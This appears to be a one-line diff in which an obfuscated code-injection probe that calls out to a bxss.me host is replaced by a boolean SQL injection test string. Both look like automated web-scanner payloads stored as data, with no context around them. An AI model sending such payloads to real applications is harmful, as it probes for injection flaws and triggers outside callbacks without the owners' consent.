@@ -1,1 +1,1 @@
-'.gethostbyname(lc('hitxb'.'mqigncrr046f5.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(106).chr(88).chr(111).chr(75).'
+-1 OR 2+162-162-1=0+0+0+1
